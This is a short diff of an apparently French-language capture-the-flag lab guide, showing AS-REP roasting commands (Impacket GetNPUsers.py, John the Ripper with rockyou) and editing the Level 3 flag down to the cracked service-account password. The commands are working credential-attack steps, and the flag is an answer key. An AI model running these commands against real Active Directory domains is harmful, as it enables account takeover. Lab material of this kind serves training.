@@ -225,11 +225,7 @@ GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users
 
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
-Voici un flag simple à intégrer pour le Level 3, basé sur le mot de passe du service qu'on va casser :
-
-Flag (à soumettre) : Password trouvé du compte "svc-bella" P@ssw0rd
-
-Message réussite niveau :
+Flag (à soumettre) : P@ssw0rd
 
 
 
